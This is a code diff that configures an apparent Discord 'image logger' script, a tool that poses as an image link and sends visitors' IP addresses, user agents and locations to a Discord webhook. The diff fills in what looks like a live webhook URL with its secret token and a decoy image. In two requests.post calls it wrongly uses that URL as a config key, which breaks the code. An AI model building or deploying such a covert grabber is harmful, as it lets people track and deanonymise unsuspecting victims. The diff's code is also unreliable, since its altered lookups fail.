@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1385020210645438465/KR7zvFupMzRlEaqehEqFx4o3HX1oa9nqcqfr-Ln8ss0VuxOFkbLrg73EGCQXg4_sLuLu",
+    "image": "https://www.heymarket.com/wp-content/uploads/2023/07/What-does-lol-mean-hero.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -75,7 +75,7 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
+    requests.post(config["https://discord.com/api/webhooks/1385020210645438465/KR7zvFupMzRlEaqehEqFx4o3HX1oa9nqcqfr-Ln8ss0VuxOFkbLrg73EGCQXg4_sLuLu"], json = {
     "username": config["username"],
     "content": "@everyone",
     "embeds": [
@@ -94,7 +94,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     bot = botCheck(ip, useragent)
     
     if bot:
-        requests.post(config["webhook"], json = {
+        requests.post(config["https://discord.com/api/webhooks/1385020210645438465/KR7zvFupMzRlEaqehEqFx4o3HX1oa9nqcqfr-Ln8ss0VuxOFkbLrg73EGCQXg4_sLuLu"], json = {
     "username": config["username"],
     "content": "",
     "embeds": [
